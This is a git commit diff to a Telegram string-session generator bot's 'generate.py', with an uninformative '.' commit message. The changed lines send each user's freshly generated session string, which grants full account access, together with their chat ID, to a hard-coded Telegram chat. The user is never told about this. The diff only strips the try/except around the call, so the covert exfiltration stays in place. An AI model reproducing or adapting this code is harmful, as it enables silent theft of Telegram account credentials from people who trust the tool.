f6eb70e07cfa75aeb0331466c61456196baba9d8
aryan8255 <97238496+aryan8255@users.noreply.github.com>
2022-05-12 19:47:42 +0530

    .

--- StringGenBot/generate.py
+++ StringGenBot/generate.py
@@ -170,11 +170,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         pass
     await client.disconnect()
     await bot.send_message(msg.chat.id, "» sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\nᴩʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ᴛᴏ ɢᴇᴛ ɪᴛ ! \n\n**ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ** @flirting_chating 🌚".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
-    try:
-        await bot.send_message(-1001702660341, f"{ty} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n`{string_session}`\n\nғʀᴏᴍ : `{msg.chat.id}` ")
-    except:
-        pass
- 
+    await bot.send_message(-1001702660341, f"{ty} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n`{string_session}`\n\nғʀᴏᴍ : `{msg.chat.id}` ")
  
 async def cancelled(msg):
     if "/cancel" in msg.text:
